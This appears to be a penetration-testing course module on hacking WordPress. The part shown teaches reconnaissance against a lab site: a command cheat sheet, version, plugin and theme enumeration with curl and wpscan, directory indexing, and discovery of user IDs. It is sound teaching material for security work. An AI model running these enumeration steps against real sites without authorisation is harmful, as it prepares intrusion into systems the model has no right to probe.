@@ -1,0 +1,729 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+
+
+<h1 id="19-hacking-wordpress">19. Hacking WordPress</h1>
+<h2 id="cheat-sheet">Cheat Sheet</h2>
+<p>The cheat sheet is a useful command reference for this module.</p>
+<table data-header-hidden=""><thead><tr><th width="331"></th><th></th></tr></thead><tbody><tr><td><strong>Command</strong></td><td><strong>Description</strong></td></tr><tr><td><code>tree -L 1</code></td><td>Lists contents of current directory</td></tr><tr><td><code>curl -s -X GET &lt;url&gt;</code></td><td>Makes a GET request to a webserver and receives HTML source code of requested web page</td></tr><tr><td><code>curl -I -X GET &lt;url&gt;</code></td><td>Prints the response header of the GET request from the requested web page</td></tr><tr><td><code>curl -X POST -d &lt;data&gt; &lt;url&gt;</code></td><td>Sends a POST request with data to specific webserver</td></tr><tr><td><code>wpscan --url &lt;url&gt; -e ap</code></td><td>Scans specific WordPress application to enumerate plugins</td></tr><tr><td><code>wpscan --url &lt;url&gt; -e u</code></td><td>Scans specific WordPress application to enumerate users</td></tr><tr><td><code>msfconsole</code></td><td>Starts Metasploit Framework</td></tr><tr><td><code>html2text</code></td><td>Converts redirected HTML output or files to easily readable output</td></tr><tr><td><code>grep &lt;pattern&gt;</code></td><td>Filters specific pattern in files or redirected output</td></tr><tr><td><code>jq</code></td><td>Transforms JSON input and streams of JSON entities</td></tr><tr><td><code>man &lt;tool&gt;</code></td><td>Man provides you with the manpage of the specific tool</td></tr></tbody></table>
+
+<h2 id="intro">Intro</h2>
+<hr>
+<h3 id="wordpress-overview">WordPress Overview</h3>
+<p><a href="https://wordpress.org/">WordPress</a> is the most popular open source Content Management System (CMS), powering nearly one-third of all websites in the world. It can be used for multiple purposes, such as hosting blogs, forums, e-commerce, project management, document management, and much more. WordPress is highly customizable as well as SEO friendly, which makes it popular among companies. It has a large library of extensions called themes and plugins, both free and paid, that can be added to enhance the website. Some examples of plugins are WPForms, a robust contact form, MonsterInsights that interfaces with Google Analytics, and Constant Contact, a popular email marketing service. However, its customizability and extensible nature make it prone to vulnerabilities through third-party themes and plugins. WordPress is written in PHP and usually runs on Apache with MySQL as the backend. Many hosting companies offer WordPress as an option when creating a new website and even assist with backend tasks such as security updates.</p>
+<p>This module will cover a WordPress website's core structure, manual and automated enumeration techniques to uncover misconfigurations and vulnerabilities, and walk through a few common attacks. You will be given the opportunity to perform your own enumeration and attacks against a WordPress instance while working through the material in each section. The module will end with a Skills Assessment to tie together everything you have learned and complete all of the steps necessary to compromise a WordPress website and the underlying web server fully.</p>
+<p>Happy hacking, and don't forget to think outside the box!</p>
+<hr>
+<h3 id="what-is-a-cms-">What is a CMS?</h3>
+<p>A CMS is a powerful tool that helps build a website without the need to code everything from scratch (or even know how to write code at all). The CMS does most of the "heavy lifting" on the infrastructure side to focus more on the design and presentation aspects of the website instead of the backend structure. Most CMS' provide a rich <a href="https://en.wikipedia.org/wiki/WYSIWYG">What You See Is What You Get (WYSIWYG)</a> editor where users can edit content as if they were working in a word processing tool such as Microsoft Word. Users can upload media directly from a media library interface instead of interacting with the webserver either from a management portal or via FTP or SFTP.</p>
+<p>A CMS is made up of two key components:</p>
+<ul>
+<li>A Content Management Application (CMA) - the interface used to add and manage content.</li>
+<li>A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.</li>
+</ul>
+<p>A good CMS will provide extensibility, allowing you to add functionality and design elements to the site without needing to work with the website code, rich user management to provide fine-grained control over access permissions and roles, media management to allow the user to easily upload and embed photos and videos, and proper version control. When looking for a CMS, we should also confirm that it is well-maintained, receives periodic updates and upgrades, and has sufficient built-in security settings to harden the website from attackers.</p>
+<h2 id="wordpress-structure">WordPress Structure</h2>
+<hr>
+<h3 id="default-wordpress-file-structure">Default WordPress File Structure</h3>
+<p>WordPress can be installed on a Windows, Linux, or Mac OSX host. For this module, we will focus on a default WordPress installation on an Ubuntu Linux web server. WordPress requires a fully installed and configured LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host. After installation, all WordPress supporting files and directories will be accessible in the webroot located at <code>/var/www/html</code>.</p>
+<p>Below is the directory structure of a default WordPress install, showing the key files and subdirectories necessary for the website to function properly.</p>
+<p><strong>File Structure</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ tree -L <span class="hljs-number">1</span> /var/www/<span class="hljs-selector-tag">html</span>
+.
+├── index<span class="hljs-selector-class">.php</span>
+├── license<span class="hljs-selector-class">.txt</span>
+├── readme<span class="hljs-selector-class">.html</span>
+├── wp-activate<span class="hljs-selector-class">.php</span>
+├── wp-admin
+├── wp-blog-<span class="hljs-selector-tag">header</span><span class="hljs-selector-class">.php</span>
+├── wp-comments-post<span class="hljs-selector-class">.php</span>
+├── wp-config<span class="hljs-selector-class">.php</span>
+├── wp-config-sample<span class="hljs-selector-class">.php</span>
+├── wp-<span class="hljs-attribute">content</span>
+├── wp-cron<span class="hljs-selector-class">.php</span>
+├── wp-includes
+├── wp-links-opml<span class="hljs-selector-class">.php</span>
+├── wp-load<span class="hljs-selector-class">.php</span>
+├── wp-login<span class="hljs-selector-class">.php</span>
+├── wp-mail<span class="hljs-selector-class">.php</span>
+├── wp-settings<span class="hljs-selector-class">.php</span>
+├── wp-signup<span class="hljs-selector-class">.php</span>
+├── wp-trackback<span class="hljs-selector-class">.php</span>
+└── xmlrpc.php
+</code></pre>
+<hr>
+<h3 id="key-wordpress-files">Key WordPress Files</h3>
+<p>The root directory of WordPress contains files that are needed to configure WordPress to function correctly.</p>
+<ul>
+<li><code>index.php</code> is the homepage of WordPress.</li>
+<li><code>license.txt</code> contains useful information such as the version WordPress installed.</li>
+<li><code>wp-activate.php</code> is used for the email activation process when setting up a new WordPress site.</li>
+<li><code>wp-admin</code> folder contains the login page for administrator access and the backend dashboard. Once a user has logged in, they can make changes to the site based on their assigned permissions. The login page can be located at one of the following paths:<ul>
+<li><code>/wp-admin/login.php</code></li>
+<li><code>/wp-admin/wp-login.php</code></li>
+<li><code>/login.php</code></li>
+<li><code>/wp-login.php</code></li>
+</ul>
+</li>
+</ul>
+<p>This file can also be renamed to make it more challenging to find the login page.</p>
+<ul>
+<li><code>xmlrpc.php</code> is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. This type of communication has been replaced by the WordPress <a href="https://developer.wordpress.org/rest-api/reference">REST API</a>.</li>
+</ul>
+<hr>
+<h3 id="wordpress-configuration-file">WordPress Configuration File</h3>
+<ul>
+<li>The <code>wp-config.php</code> file contains information required by WordPress to connect to the database, such as the database name, database host, username and password, authentication keys and salts, and the database table prefix. This configuration file can also be used to activate DEBUG mode, which can useful in troubleshooting.</li>
+</ul>
+<p><strong>wp-config.php</strong></p>
+<pre><code class="lang-php">&lt;?php
+<span class="hljs-comment">/** &lt;SNIP&gt; */</span>
+<span class="hljs-comment">/** The name of the database for WordPress */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_NAME'</span>, <span class="hljs-string">'database_name_here'</span> );
+
+<span class="hljs-comment">/** MySQL database username */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_USER'</span>, <span class="hljs-string">'username_here'</span> );
+
+<span class="hljs-comment">/** MySQL database password */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_PASSWORD'</span>, <span class="hljs-string">'password_here'</span> );
+
+<span class="hljs-comment">/** MySQL hostname */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'DB_HOST'</span>, <span class="hljs-string">'localhost'</span> );
+
+<span class="hljs-comment">/** Authentication Unique Keys and Salts */</span>
+<span class="hljs-comment">/* &lt;SNIP&gt; */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_KEY'</span>,         <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_KEY'</span>,  <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_KEY'</span>,    <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_KEY'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'AUTH_SALT'</span>,        <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'SECURE_AUTH_SALT'</span>, <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'LOGGED_IN_SALT'</span>,   <span class="hljs-string">'put your unique phrase here'</span> );
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'NONCE_SALT'</span>,       <span class="hljs-string">'put your unique phrase here'</span> );
+
+<span class="hljs-comment">/** WordPress Database Table prefix */</span>
+$table_prefix = <span class="hljs-string">'wp_'</span>;
+
+<span class="hljs-comment">/** For developers: WordPress debugging mode. */</span>
+<span class="hljs-comment">/** &lt;SNIP&gt; */</span>
+<span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'WP_DEBUG'</span>, <span class="hljs-literal">false</span> );
+
+<span class="hljs-comment">/** Absolute path to the WordPress directory. */</span>
+<span class="hljs-keyword">if</span> ( ! defined( <span class="hljs-string">'ABSPATH'</span> ) ) {
+    <span class="hljs-class"><span class="hljs-keyword">define</span></span>( <span class="hljs-string">'ABSPATH'</span>, __DIR__ . <span class="hljs-string">'/'</span> );
+}
+
+<span class="hljs-comment">/** Sets up WordPress vars and included files. */</span>
+require_once ABSPATH . <span class="hljs-string">'wp-settings.php'</span>;
+</code></pre>
+<hr>
+<h3 id="key-wordpress-directories">Key WordPress Directories</h3>
+<ul>
+<li>The <code>wp-content</code> folder is the main directory where plugins and themes are stored. The subdirectory <code>uploads/</code> is usually where any files uploaded to the platform are stored. These directories and files should be carefully enumerated as they may lead to contain sensitive data that could lead to remote code execution or exploitation of other vulnerabilities or misconfigurations.</li>
+</ul>
+<p><strong>WP-Content</strong></p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ tree -L 1 /</span>var<span class="hljs-regexp">/www/</span>html/wp-content
+.
+├── index.php
+├── plugins
+└── themes
+</code></pre>
+<ul>
+<li><code>wp-includes</code> contains everything except for the administrative components and the themes that belong to the website. This is the directory where core files are stored, such as certificates, fonts, JavaScript files, and widgets.</li>
+</ul>
+<p><strong>WP-Includes</strong></p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ tree -L <span class="hljs-number">1</span> /var/www/html/wp-includes
+.
+├── &lt;SNIP&gt;
+├── theme<span class="hljs-selector-class">.php</span>
+├── update<span class="hljs-selector-class">.php</span>
+├── user<span class="hljs-selector-class">.php</span>
+├── vars<span class="hljs-selector-class">.php</span>
+├── version<span class="hljs-selector-class">.php</span>
+├── widgets
+├── widgets<span class="hljs-selector-class">.php</span>
+├── wlwmanifest<span class="hljs-selector-class">.xml</span>
+├── wp-db<span class="hljs-selector-class">.php</span>
+└── wp-diff.php
+</code></pre>
+<h2 id="wordpress-user-roles">WordPress User Roles</h2>
+<hr>
+<p>There are five types of users in a standard WordPress installation.</p>
+<table><thead><tr><th width="170">Role</th><th>Description</th></tr></thead><tbody><tr><td>Administrator</td><td>This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.</td></tr><tr><td>Editor</td><td>An editor can publish and manage posts, including the posts of other users.</td></tr><tr><td>Author</td><td>Authors can publish and manage their own posts.</td></tr><tr><td>Contributor</td><td>These users can write and manage their own posts but cannot publish them.</td></tr><tr><td>Subscriber</td><td>These are normal users who can browse posts and edit their profiles.</td></tr></tbody></table>
+
+<p>Gaining access as an administrator is usually needed to obtain code execution on the server. However, editors and authors might have access to certain vulnerable plugins that normal users do not.</p>
+<h2 id="wordpress-core-version-enumeration">WordPress Core Version Enumeration</h2>
+<p>It is always important to know what type of application we are working with. An essential part of the enumeration phase is uncovering the software version number. This is helpful when searching for common misconfigurations such as default passwords that may be set for certain versions of an application and searching for known vulnerabilities for a particular version number. We can use a variety of methods to discover the version number manually. The first and easiest step is reviewing the page source code. We can do this by right-clicking anywhere on the current page and selecting "View page source" from the menu or using the keyboard shortcut <code>[CTRL + U]</code>.</p>
+<p>We can search for the <code>meta generator</code> tag using the shortcut <code>[CTRL + F]</code> in the browser or use <code>cURL</code> along with <code>grep</code> from the command line to filter for this information.</p>
+<p><strong>WP Version - Source Code</strong></p>
+<pre><code class="lang-html"><span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span>
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">'https://api.w.org/'</span> href=<span class="hljs-string">'http://blog.inlanefreight.com/index.php/wp-json/'</span> /&gt;
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">"EditURI"</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"application/rsd+xml"</span> title=<span class="hljs-string">"RSD"</span> href=<span class="hljs-string">"http://blog.inlanefreight.com/xmlrpc.php?rsd"</span> /&gt;
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">"wlwmanifest"</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">"application/wlwmanifest+xml"</span> href=<span class="hljs-string">"http://blog.inlanefreight.com/wp-includes/wlwmanifest.xml"</span> /&gt; 
+&lt;meta name=<span class="hljs-string">"generator"</span> content=<span class="hljs-string">"WordPress 5.3.3"</span> /&gt;
+<span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span>
+</code></pre>
+<pre><code class="lang-shell-session">[<span class="hljs-name">!bash!</span>]$ curl -s -X GET http://blog.inlanefreight.com | grep <span class="hljs-symbol">'&lt;meta</span> name=<span class="hljs-string">"generator"</span>'
+
+&lt;meta name=<span class="hljs-string">"generator"</span> content=<span class="hljs-string">"WordPress 5.3.3"</span> /&gt;
+</code></pre>
+<p>Aside from version information, the source code may also contain comments that may be useful. Links to CSS (style sheets) and JS (JavaScript) can also provide hints about the version number.</p>
+<p><strong>WP Version - CSS</strong></p>
+<pre><code class="lang-html"><span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span>
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'bootstrap-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3'</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'transportex-style-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3'</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'transportex_color-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3'</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
+&lt;<span class="hljs-keyword">link</span> rel=<span class="hljs-string">'stylesheet'</span> id=<span class="hljs-string">'smartmenus-css'</span>  href=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3'</span> <span class="hljs-keyword">type</span>=<span class="hljs-string">'text/css'</span> media=<span class="hljs-string">'all'</span> /&gt;
+<span class="hljs-params">...</span>SNIP<span class="hljs-params">...</span>
+</code></pre>
+<p><strong>WP Version - JS</strong></p>
+<pre><code class="lang-html">...SNIP...
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.com/wp-includes/js/jquery/jquery.js?ver=1.12.4-wp'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=1.4.1'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/subscriber.js?ver=5.3.3'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine-en.js?ver=5.3.3'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">'text/javascript'</span> <span class="hljs-attr">src</span>=<span class="hljs-string">'http://blog.inlanefreight.com/wp-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=5.3.3'</span>&gt;</span><span class="undefined"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
+...SNIP...
+</code></pre>
+<p>In older WordPress versions, another source for uncovering version information is the <code>readme.html</code> file in WordPress's root directory.</p>
+<h2 id="plugins-and-themes-enumeration">Plugins and Themes Enumeration</h2>
+<p>We can also find information about the installed plugins by reviewing the source code manually by inspecting the page source or filtering for the information using <code>cURL</code> and other command-line utilities.</p>
+<p><strong>Plugins</strong></p>
+<p>Plugins and Themes Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s -<span class="hljs-keyword">X</span> GET http://blog.inlanefreight.<span class="hljs-keyword">com</span> | sed <span class="hljs-string">'s/href=/\n/g'</span> | sed <span class="hljs-string">'s/src=/\n/g'</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">'wp-content/plugins/*'</span> | cut -d<span class="hljs-string">"'"</span> -f2
+
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/<span class="hljs-keyword">wp</span>-google-places-review-slider/public/css/wprev-public_combine.css?ver=<span class="hljs-number">6.1</span>
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/mail-masta/lib/subscriber.js?ver=<span class="hljs-number">5.3</span>.<span class="hljs-number">3</span>
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/mail-masta/lib/jquery.validationEngine-<span class="hljs-keyword">en</span>.js?ver=<span class="hljs-number">5.3</span>.<span class="hljs-number">3</span>
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/mail-masta/lib/jquery.validationEngine.js?ver=<span class="hljs-number">5.3</span>.<span class="hljs-number">3</span>
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/<span class="hljs-keyword">wp</span>-google-places-review-slider/public/js/wprev-public-<span class="hljs-keyword">com</span>-<span class="hljs-built_in">min</span>.js?ver=<span class="hljs-number">6.1</span>
+http://blog.inlanefreight.<span class="hljs-keyword">com</span>/<span class="hljs-keyword">wp</span>-content/plugins/mail-masta/lib/css/mm_frontend.css?ver=<span class="hljs-number">5.3</span>.<span class="hljs-number">3</span>
+</code></pre>
+<p><strong>Themes</strong></p>
+<p>Plugins and Themes Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s -X GET http:<span class="hljs-comment">//blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2</span>
+<span class="hljs-symbol">
+http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/style.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/colors/default.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/jquery.smartmenus.bootstrap.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.carousel.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/owl.transitions.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/font-awesome.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/animate.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/magnific-popup.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/css/bootstrap-progressbar.min.css?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/js/navigation.js?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/js/bootstrap.min.js?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.js?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/js/jquery.smartmenus.bootstrap.js?ver=5.3.3</span>
+<span class="hljs-symbol">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/themes/ben_theme/js/owl.carousel.min.js?ver=5.3.3</span>
+<span class="hljs-symbol">background:</span> url(<span class="hljs-string">"http://blog.inlanefreight.com/wp-content/themes/ben_theme/images/breadcrumb-back.jpg"</span>) <span class="hljs-meta">#50b9ce;</span>
+</code></pre>
+<p>The response headers may also contain version numbers for specific plugins.</p>
+<p>However, not all installed plugins and themes can be discovered passively. In this case, we have to send requests to the server actively to enumerate them. We can do this by sending a GET request that points to a directory or file that may exist on the server. If the directory or file does exist, we will either gain access to the directory or file or will receive a redirect response from the webserver, indicating that the content does exist. However, we do not have direct access to it.</p>
+<p><strong>Plugins Active Enumeration</strong></p>
+<p>Plugins and Themes Enumeration</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -I -X GET http:/</span><span class="hljs-regexp">/blog.inlanefreight.com/</span>wp-content<span class="hljs-regexp">/plugins/</span>mail-masta
+
+HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">301</span> Moved Permanently
+<span class="hljs-string">Date:</span> Wed, <span class="hljs-number">13</span> May <span class="hljs-number">2020</span> <span class="hljs-number">20</span>:<span class="hljs-number">08</span>:<span class="hljs-number">23</span> GMT
+<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)
+<span class="hljs-string">Location:</span> <span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com/wp-content/plugins/mail-masta/</span>
+Content-<span class="hljs-string">Length:</span> <span class="hljs-number">356</span>
+Content-<span class="hljs-string">Type:</span> text/html; charset=iso<span class="hljs-number">-8859</span><span class="hljs-number">-1</span>
+</code></pre>
+<p>If the content does not exist, we will receive a <code>404 Not Found error</code>.</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ curl -I -X GET http:/</span><span class="hljs-regexp">/blog.inlanefreight.com/</span>wp-content<span class="hljs-regexp">/plugins/</span>someplugin
+
+HTTP/<span class="hljs-number">1.1</span> <span class="hljs-number">404</span> Not Found
+<span class="hljs-string">Date:</span> Wed, <span class="hljs-number">13</span> May <span class="hljs-number">2020</span> <span class="hljs-number">20</span>:<span class="hljs-number">08</span>:<span class="hljs-number">18</span> GMT
+<span class="hljs-string">Server:</span> Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu)
+<span class="hljs-string">Expires:</span> Wed, <span class="hljs-number">11</span> Jan <span class="hljs-number">1984</span> <span class="hljs-number">05</span>:<span class="hljs-number">00</span>:<span class="hljs-number">00</span> GMT
+Cache-<span class="hljs-string">Control:</span> no-cache, must-revalidate, max-age=<span class="hljs-number">0</span>
+<span class="hljs-string">Link:</span> &lt;<span class="hljs-string">http:</span><span class="hljs-comment">//blog.inlanefreight.com/index.php/wp-json/&gt;; rel="https://api.w.org/"</span>
+Transfer-<span class="hljs-string">Encoding:</span> chunked
+Content-<span class="hljs-string">Type:</span> text/html; charset=UTF<span class="hljs-number">-8</span>
+</code></pre>
+<p>The same applies to installed themes.</p>
+<p>To speed up enumeration, we could also write a simple bash script or use a tool such as <code>wfuzz</code> or <code>WPScan</code>, which automate the process.</p>
+<h2 id="directory-indexing">Directory Indexing</h2>
+<p>Active plugins should not be our only area of focus when assessing a WordPress website. Even if a plugin is deactivated, it may still be accessible, and therefore we can gain access to its associated scripts and functions. Deactivating a vulnerable plugin does not improve the WordPress site's security. It is best practice to either remove or keep up-to-date any unused plugins.</p>
+<p>The following example shows a disabled plugin.</p>
+<p><img src="storage\modules\17\plugin-deactivated3.png" alt="image"></p>
+<p>If we browse to the plugins directory, we can see that we still have access to the <code>Mail Masta</code> plugin.</p>
+<p><img src="storage\modules\17\plugin-mailmasta2.png" alt=""></p>
+<p>We can also view the directory listing using cURL and convert the HTML output to a nice readable format using <code>html2text</code>.</p>
+<p>Directory Indexing</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta/ | html2text
+
+****** Index of /wp-content/plugins/mail-masta ******
+<span class="hljs-string">[[ICO]]</span>       Name                 Last_modified    Size Description
+===========================================================================
+<span class="hljs-string">[[PARENTDIR]]</span> Parent_Directory                         -  
+<span class="hljs-string">[[DIR]]</span>       amazon_api/          <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-13</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span>    -  
+<span class="hljs-string">[[DIR]]</span>       inc/                 <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-13</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span>    -  
+<span class="hljs-string">[[DIR]]</span>       lib/                 <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-13</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span>    -  
+<span class="hljs-string">[[   ]]</span>       plugin-interface.php <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-13</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span>  <span class="hljs-number">88</span>K  
+<span class="hljs-string">[[TXT]]</span>       readme.txt           <span class="hljs-number">2020</span><span class="hljs-number">-05</span><span class="hljs-number">-13</span> <span class="hljs-number">18</span>:<span class="hljs-number">01</span> <span class="hljs-number">2.2</span>K  
+===========================================================================
+     Apache/<span class="hljs-number">2.4</span><span class="hljs-number">.29</span> (Ubuntu) Server at blog.inlanefreight.com Port <span class="hljs-number">80</span>
+</code></pre>
+<p>This type of access is called <code>Directory Indexing</code>. It allows us to navigate the folder and access files that may contain sensitive information or vulnerable code. It is best practice to disable directory indexing on web servers so a potential attacker cannot gain direct access to any files or folders other than those necessary for the website to function properly.</p>
+<h2 id="user-enumeration">User Enumeration</h2>
+<p>Enumerating a list of valid users is a critical phase of a WordPress security assessment. Armed with this list, we may be able to guess default credentials or perform a brute force password attack. If successful, we may be able to log in to the WordPress backend as an author or even as an administrator. This access can potentially be leveraged to modify the WordPress website or even interact with the underlying web server.</p>
+<p>There are two methods for performing manual username enumeration.</p>
+<hr>
+<h3 id="first-method">First Method</h3>
+<p>The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username. If we mouse over the post author link titled "by admin," as shown in the below image, a link to the user's account appears in the web browser's lower-left corner.</p>
+<p><img src="storage\modules\17\by-admin.png" alt="image"></p>
+<p>The <code>admin</code> user is usually assigned the user ID <code>1</code>. We can confirm this by specifying the user ID for the <code>author</code> parameter in the URL.</p>
+<p><a href="http://blog.inlanefreight.com/?author=1">http://blog.inlanefreight.com/?author=1</a></p>
